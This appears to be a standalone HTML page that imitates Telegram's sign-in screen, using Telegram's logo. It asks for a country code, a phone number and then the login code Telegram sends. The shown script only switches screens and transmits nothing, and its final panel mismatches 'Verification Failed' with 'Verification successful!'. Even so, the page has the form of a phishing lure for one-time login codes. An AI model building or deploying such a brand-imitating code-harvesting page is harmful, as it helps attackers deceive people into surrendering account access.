<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to Telegram</title>
    <style>
        body {
            font-family: 'Open Sans', Arial, sans-serif;
            background-color: #ffffff;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #ffffff;
            padding: 20px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            text-align: center;
            width: 100%;
            max-width: 400px;
            position: relative;
        }

        .container img {
            width: 90px;
            margin-bottom: 10px;
        }

        h1 {
            font-size: 20px;
            color: #333333;
            margin: 5px 0;
        }

        p {
            font-size: 14px;
            color: #777;
            margin-bottom: 20px;
        }

        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }

        .input-group label {
            display: block;
            font-size: 14px;
            color: #555;
            margin-bottom: 5px;
        }

        select, input[type="text"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            font-size: 16px;
            box-sizing: border-box;
            margin-bottom: 10px;
        }

        input[type="text"] {
            -webkit-appearance: none;
            -moz-appearance: textfield;
        }

        input[type="text"]::-webkit-inner-spin-button,
        input[type="text"]::-webkit-outer-spin-button {
            -webkit-appearance: none;
            margin: 0;
        }

        .dropdown {
            display: flex;
            align-items: center;
            justify-content: space-between;
            cursor: pointer;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            position: relative;
        }

        .dropdown-content {
            display: none;
            position: absolute;
            background-color: #ffffff;
            border: 1px solid #ccc;
            border-radius: 5px;
            width: 100%;
            max-height: 200px;
            overflow-y: auto;
            z-index: 1;
            top: 50px;
            left: 0;
            transition: opacity 0.3s ease;
        }

        .dropdown-content div {
            padding: 10px;
            cursor: pointer;
        }

        .dropdown-content div:hover {
            background-color: #f0f0f0;
        }

        .dropdown-content img {
            width: 24px;
            margin-right: 10px;
        }

        .button {
            width: 100%;
            padding: 12px;
            background-color: #0088cc;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            margin-top: 10px;
            transition: background-color 0.3s ease;
        }

        .button:hover {
            background-color: #007ab8;
        }

        .dropdown::after {
            content: '>';
            display: inline-block;
            font-size: 20px;
            margin-left: 10px;
            transition: transform 0.3s ease;
        }

        .dropdown.open::after {
            transform: rotate(180deg);
        }

        #verificationContainer, #finalMessageContainer {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container" id="initialContainer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h1>Sign in to Telegram</h1>
        <p>Please confirm your country code and enter your phone number.</p>

        <div class="input-group">
            <label for="countryCode">Country</label>
            <div class="dropdown" id="dropdown">
                <span id="selectedCountry">Select Country</span>
            </div>
            <div class="dropdown-content" id="dropdownContent">
                <!-- Country options will be dynamically added here -->
            </div>
        </div>

        <div class="input-group">
            <label for="phoneNumber">Phone Number</label>
            <input type="text" id="phoneNumber" placeholder="Phone Number" inputmode="tel" pattern="[0-9]*">
        </div>

        <div>
            <input type="checkbox" id="keepSignedIn"> Keep me signed in
        </div>

        <button class="button" onclick="goToVerificationPage()">Next</button>
    </div>

    <div class="container" id="verificationContainer">
        <img src="https://upload.wikimedia.org/wikipedia/commons/8/82/Telegram_logo.svg" alt="Telegram Logo">
        <h1 id="phoneDisplay"></h1>
        <p>We have sent you a message in Telegram with the code.</p>

        <div class="input-group">
            <label for="verificationCode">Code</label>
            <input type="text" id="verificationCode" placeholder="Code" inputmode="tel" pattern="[0-9]*">
        </div>

        <button class="button" onclick="submitVerification()">Submit</button>
    </div>

    <div class="container" id="finalMessageContainer">
        <h1>Verification Failed</h1>
        <p id="finalMessage"></p>
        <button class="button" onclick="resetForm()">Try Again</button>
    </div>

    <script>
        const countryList = [

            { code: '+44', name: 'United Kingdom', flag: 'ðŸ‡¬ðŸ‡§' },
            { code: '+61', name: 'Australia', flag: 'ðŸ‡¦ðŸ‡º' },
            { code: '+49', name: 'Germany', flag: 'ðŸ‡©ðŸ‡ª' },
            { code: '+33', name: 'France', flag: 'ðŸ‡«ðŸ‡·' },
            { code: '+81', name: 'Japan', flag: 'ðŸ‡¯ðŸ‡µ' },
            { code: '+91', name: 'India', flag: 'ðŸ‡®ðŸ‡³' },
            { code: '+86', name: 'China', flag: 'ðŸ‡¨ðŸ‡³' },
            { code: '+7', name: 'Russia', flag: 'ðŸ‡·ðŸ‡º' },
            { code: '+82', name: 'South Korea', flag: 'ðŸ‡°ðŸ‡·' },
            { code: '+55', name: 'Brazil', flag: 'ðŸ‡§ðŸ‡·' },
            { code: '+34', name: 'Spain', flag: 'ðŸ‡ªðŸ‡¸' },
            { code: '+39', name: 'Italy', flag: 'ðŸ‡®ðŸ‡¹' },
            { code: '+27', name: 'South Africa', flag: 'ðŸ‡¿ðŸ‡¦' },
            { code: '+31', name: 'Netherlands', flag: 'ðŸ‡³ðŸ‡±' },
            { code: '+47', name: 'Norway', flag: 'ðŸ‡³ðŸ‡´' },
            { code: '+56', name: 'Chile', flag: 'ðŸ‡¨ðŸ‡±' },
            { code: '+52', name: 'Mexico', flag: 'ðŸ‡²ðŸ‡½' },
            { code: '+48', name: 'Poland', flag: 'ðŸ‡µðŸ‡±' },
            { code: '+65', name: 'Singapore', flag: 'ðŸ‡¸ðŸ‡¬' },
            { code: '+60', name: 'Malaysia', flag: 'ðŸ‡²ðŸ‡¾' }
        ];

        const dropdown = document.getElementById('dropdown');
        const dropdownContent = document.getElementById('dropdownContent');
        const selectedCountry = document.getElementById('selectedCountry');
        const phoneNumberInput = document.getElementById('phoneNumber');

        // Populate dropdown with countries
        countryList.forEach(country => {
            const option = document.createElement('div');
            option.innerHTML = `<span>${country.flag}</span> ${country.name} (${country.code})`;
            option.addEventListener('click', () => selectCountry(country));
            dropdownContent.appendChild(option);
        });

        dropdown.addEventListener('click', () => {
            dropdownContent.style.display = dropdownContent.style.display === 'none' || dropdownContent.style.display === '' ? 'block' : 'none';
            dropdown.classList.toggle('open');
        });

        function selectCountry(country) {
            selectedCountry.textContent = `${country.flag} ${country.name} (${country.code})`;
            phoneNumberInput.value = country.code + ' ';
            dropdownContent.style.display = 'none';
            dropdown.classList.remove('open');
        }

        function goToVerificationPage() {
            const phoneNumber = document.getElementById('phoneNumber').value.trim();
            if (!phoneNumber || phoneNumber.length <= 3) {
                alert('Please enter your phone number.');
                return;
            }
            document.getElementById('initialContainer').style.display = 'none';
            document.getElementById('verificationContainer').style.display = 'block';
            document.getElementById('phoneDisplay').textContent = `Phone Number: ${phoneNumber}`;
        }

        function submitVerification() {
            const verificationCode = document.getElementById('verificationCode').value.trim();
            if (!verificationCode) {
                alert('Please enter the verification code.');
                return;
            }
            document.getElementById('verificationContainer').style.display = 'none';
            document.getElementById('finalMessageContainer').style.display = 'block';
            document.getElementById('finalMessage').textContent = 'Verification successful!';
        }

        function resetForm() {
            document.getElementById('finalMessageContainer').style.display = 'none';
            document.getElementById('initialContainer').style.display = 'block';
            document.getElementById('phoneNumber').value = '';
            document.getElementById('verificationCode').value = '';
        }
    </script>
</body>
</html>
